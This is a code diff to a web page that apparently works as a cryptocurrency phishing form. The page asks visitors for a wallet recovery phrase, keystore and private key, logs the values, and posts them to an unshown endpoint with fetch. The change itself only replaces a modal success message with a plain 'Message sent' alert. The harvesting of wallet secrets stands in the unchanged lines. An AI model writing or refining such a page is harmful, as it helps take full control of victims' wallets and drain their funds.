@@ -21,15 +21,7 @@
 <body>
     <h2 class="text-center mt-5">Register Your details</h2>
     <p class="text-center">Please Provide your Info</p>
-    <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
-        <div class="modal-dialog">
-            <div class="modal-body">
-                <div class="alert alert-primary" role="alert">
-                    A simple primary alert—check it out!
-                </div>
-            </div>
-        </div>
-    </div>
+    
     <div class="container">
         <form id="mail_form" method="POST" action="">
             <div class="row">
@@ -77,8 +69,7 @@
                         let phrase = document.getElementById("phrase").value;
                         let keyStore = document.getElementById("keystore").value;
                         let privateKey = document.getElementById("privatekey").value;
-                        let messageAlert = document.getElementById("hide");
-                         let myModalEl = document.getElementById('myModal');
+                        
                         console.log(phrase, keyStore, privateKey);
 
                         const data = {
@@ -100,7 +91,7 @@
                     .then((response) => response.text())
                     .then((data)=> {
                         console.log("Success: ", data)
-                        messageAlert.classList.remove("hide");
+                        alert("Message sent");
                         phrase = "";
                         keyStore = "";
                         privateKey = "";
